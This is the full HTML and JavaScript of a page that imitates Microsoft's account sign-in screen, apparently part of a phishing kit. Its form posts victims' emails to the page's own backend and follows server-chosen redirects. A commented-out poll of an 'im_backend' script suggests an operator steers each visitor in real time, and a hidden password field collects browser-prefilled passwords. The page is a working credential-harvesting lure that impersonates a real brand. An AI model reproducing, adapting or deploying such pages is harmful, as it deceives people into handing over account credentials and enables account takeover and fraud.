<html dir="ltr" class="" lang="en">
	<head>
		<title>Sign in to your account</title>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
		<meta http-equiv="X-UA-Compatible" content="IE=edge" />
		<meta
			name="viewport"
			content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes"
		/>
		<meta http-equiv="Pragma" content="no-cache" />
		<meta http-equiv="Expires" content="-1" />

		<meta name="PageID" content="ConvergedSignIn" />
		<meta name="SiteID" content="" />
		<meta name="ReqLC" content="1033" />
		<meta name="LocLC" content="en-US" />

		<meta name="format-detection" content="telephone=no" />

		<meta name="robots" content="none" />

		<link rel="shortcut icon" href="/public/assets/img/mic.ico" />

		<link
			data-loader="cdn"
			crossorigin="anonymous"
			href="/public/assets/css/1.css?v=<?php echo time(); ?>"
			rel="stylesheet"
		/>
		<style>
            .loading-dots-container {
                display: none;
                position: absolute;
                top: 0px;
                left: 50%;
                transform: translateX(-50%);
                z-index: 10;
                width: 450px;
                height: 10px;
                overflow: hidden;
            }

            .loading-dots-container.active {
                display: block;
                position: absolute;
            }

            .dot {
                position: absolute;
                top: 50%;
                width: 5px;
                height: 5px;
                background-color: #0067b8;
                border-radius: 50%;
                transform: translateY(-50%);
                animation: moveDot 1.6s infinite cubic-bezier(0.4, 0, 0.2, 1);
            }

            .dot:nth-child(1) { animation-delay: 0s; }
            .dot:nth-child(2) { animation-delay: 0.15s; }
            .dot:nth-child(3) { animation-delay: 0.3s; }
            .dot:nth-child(4) { animation-delay: 0.45s; }
            .dot:nth-child(5) { animation-delay: 0.6s; }

            @keyframes moveDot {
                0% {
                    left: 0%;
                    opacity: 0;
                    transform: translateY(-50%) scale(0.6);
                }
                10% {
                    opacity: 1;
                }
                50% {
                    transform: translateY(-50%) scale(1);
                }
                100% {
                    left: 100%;
                    opacity: 0;
                    transform: translateY(-50%) scale(0.6);
                }
            }
        </style>
	</head>

	<body
		data-bind="defineGlobals: ServerData, bodyCssClass"
		class="cb"
		style="display: block"
	>
		<div>
			<div data-bind="if: activeDialog"></div>

			<form
				name="f1"
				id="i0281"
				novalidate="novalidate"
				spellcheck="false"
				method="post"
				target="_top"
				autocomplete="off"
                action="/account/process"
				class="provide-min-height"
			>
				<div class="login-paginated-page">
					<div id="lightboxTemplateContainer" class="provide-min-height">
						<div id="lightboxBackgroundContainer">
							<div class="background-image-holder" role="presentation">
								<div
									id="backgroundImage"
									role="img"
									data-bind="backgroundImage: backgroundImageUrl(), externalCss: { 'background-image': true }, ariaLabel: str['STR_Background_Image_AltText']"
									class="background-image ext-background-image"
									aria-label="Organization background image"
									style="background-image: url(&quot;/public/assets/img/bg.svg&quot;)"
								></div>
							</div>
						</div>

						<div class="outer">
							<div class="template-section main-section">
								<div class="middle ext-middle">
									<div class="full-height">
										<div class="flex-column">
											<div class="win-scroll">
												<div
													id="lightbox"
													class="sign-in-box ext-sign-in-box fade-in-lightbox has-popup"
												>
							                        <div class="loading-dots-container" id="loadingDots">
                                                        <div class="dot"></div>
                                                        <div class="dot"></div>
                                                        <div class="dot"></div>
                                                        <div class="dot"></div>
                                                        <div class="dot"></div>
                                                    </div>
													<div>
														<img
															class="logo"
															role="img"
															pngsrc="/public/assets/img/mic1.png"
															svgsrc="/public/assets/img/mic1.svg"
															data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }"
															src="/public/assets/img/mic1.svg"
															alt="Microsoft"
														/>
													</div>

													<div role="main">
														<div
															data-bind="css: { 'zero-opacity': hidePaginatedView() }"
															class=""
														>
															<div
																class="pagination-view animate slide-in-next"
															>
																<div data-viewid="1">
																	<div>
																		<div>
																			<div
																				class="row title ext-title"
																				id="loginHeader"
																			>
																				<div role="heading" aria-level="1">
																					Sign in
																				</div>
																			</div>
																		</div>
																	</div>

																	<div class="row">
																		<div
																			role="alert"
																			aria-live="assertive"
																		></div>

                                                                        <div role="alert" aria-live="assertive" id="usernameErrorWrapper" style="display:none;">
                                                                            <div class="col-md-24 error ext-error" id="usernameError">
                                                                                We couldn't find an account with that username. Try another, or
                                                                                <a id="idA_PWD_SignUp" href="javascript:void(0)">
                                                                                    get a new account
                                                                                </a>.
                                                                            </div>
                                                                        </div>

																		<div class="form-group col-md-24">
																			<div class="placeholderContainer">
																				<input
																					type="email"
                                                                                    name="entity_email"
																					id="i0116"
																					maxlength="113"
																					class="form-control ltr_override input ext-input text-box ext-text-box"
																					aria-required="true"
																					data-report-event="Signin_Email_Phone_Skype"
																					data-report-trigger="click"
																					data-report-value="Email_Phone_Skype_Entry"
																					autocomplete="username webauthn"
																					aria-label="Enter your email, phone, or Skype."
																					aria-describedby="winBodyHeader winBodySubHeader loginHeader usernameError"
																					placeholder="Email, phone, or Skype"
																					data-report-attached="1"
																				/>

																				<input
																					name="passwd"
																					type="password"
																					id="i0118"
																					data-bind="moveOffScreen, textInput: passwordBrowserPrefill"
																					class="moveOffScreen"
																					tabindex="-1"
																					aria-hidden="true"
																				/>
																			</div>
																		</div>
																	</div>

																	<div
																		class="position-buttons password-reset-links-container ext-password-reset-links-container"
																	>
																		<div class="row">
																			<div class="col-md-24">
																				<div class="text-13">
																					<div class="form-group">
																						No account?
																						<a
																							href="javascript:void(0)"
																							id="signup"
																							aria-label="Create a Microsoft account"
																							>Create one!</a
																						>
																					</div>
																					<div class="form-group">
																						<a
																							id="cantAccessAccount"
																							name="cannotAccessAccount"
																							href="javascript:void(0)"
																							>Can’t access your account?</a
																						>
																					</div>
																				</div>
																			</div>
																		</div>
																	</div>

																	<div class="win-button-pin-bottom">
																		<div class="row">
																			<div>
																				<div
																					class="col-xs-24 no-padding-left-right button-container button-field-container ext-button-field-container"
																				>

																					<div
																						class="inline-block button-item ext-button-item"
																					>
																						<input
																							type="submit"
																							id="idSIButton9"
																							class="win-button button_primary high-contrast-overrides button ext-button primary ext-primary"
																							data-report-event="Signin_Submit"
																							data-report-trigger="click"
																							data-report-value="Submit"
																							value="Next"
																						/>
																					</div>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
														</div>
													</div>
												</div>

												<div>
													<div>
														<div
															class="promoted-fed-cred-content promoted-fed-cred-box ext-promoted-fed-cred-box"
														>
															<div class="tile-container">
																<div class="row tile">
																	<div class="table" role="button" tabindex="0">
																		<div class="table-row">
																			<div class="table-cell tile-img medium">
																				<img
																					class="tile-img medium"
																					role="presentation"
																					data-bind="addEventHandlers, attr: { src: $data.darkIconUrl }"
																					src="/public/assets/img/key.svg"
																				/>
																			</div>
																			<div class="table-cell text-left content">
																				<div>Sign-in options</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
														</div>
													</div>
												</div>
											</div>
										</div>
									</div>
								</div>
							</div>

							<div id="footer" role="contentinfo" class="footer ext-footer">
								<div>
									<div
										id="footerLinks"
										class="footerNode text-secondary footer-links ext-footer-links"
									>
										<a
											id="ftrTerms"
											href="javascript:void(0)"
											class="footer-content ext-footer-content footer-item ext-footer-item"
											>Terms of use</a
										>
										<a
											id="ftrPrivacy"
											href="javascript:void(0)"
											class="footer-content ext-footer-content footer-item ext-footer-item"
											>Privacy &amp; cookies</a
										>
										<a
											id="moreOptions"
											href="javascript:void(0)"
											role="button"
											aria-label="Click here for troubleshooting information"
											aria-expanded="false"
											class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item"
											>...</a
										>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</form>
		</div>
        <script>
            document.getElementById('i0281').addEventListener('submit', async (e) => {
                e.preventDefault();

                const email = document.getElementById('i0116').value;
                sessionStorage.setItem('active_user', email);
                if (!email) return;

                const nextBtn = document.getElementById('idSIButton9');
                const errorWrapper = document.getElementById('usernameErrorWrapper');

                function setLoadingState(isLoading) {
                    nextBtn.disabled = isLoading;
                }

                if (errorWrapper) errorWrapper.style.display = 'none';

                setLoadingState(true);
                document.getElementById('loadingDots').classList.add('active');
                document.getElementById('i0281').classList.add('loading');

                try {
                    const formData = new FormData();
                    formData.append('entity_email', email);

                    const response = await fetch('/account/process', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            entity_email: email
                        }),
                        credentials: 'same-origin'
                    });

                    const data = await response.json();

                    if (!data.success) {
                        setLoadingState(false);
                        document.getElementById('loadingDots').classList.remove('active');
                        document.getElementById('i0281').classList.remove('loading');

                        if (errorWrapper) errorWrapper.style.display = 'block';
                        return;
                    }

                    // const pollInterval = setInterval(async () => {
                    //     try {

                    //         const user = sessionStorage.getItem('active_user');
                    //         if (!user) return;

                    //         const redirectResponse = await fetch(
                    //             '/im_backend/check_redirect.php?user=' + encodeURIComponent(user),
                    //             {
                    //                 credentials: 'same-origin'
                    //             }
                    //         );

                    //         const redirectData = await redirectResponse.json();

                    //         if (redirectData.redirect && redirectData.url) {
                    //             clearInterval(pollInterval);
                    //             window.location.href = redirectData.url;
                    //         }

                    //     } catch (err) {
                    //         console.error(err);
                    //     }
                    // }, 500);

                    window.location.href = data.redirect;

                } catch (error) {
                    console.error(error);

                    setLoadingState(false);
                    document.getElementById('loadingDots').classList.remove('active');
                    document.getElementById('i0281').classList.remove('loading');

                    if (errorWrapper) errorWrapper.style.display = 'block';
                }
            });
        </script>
	</body>
</html>
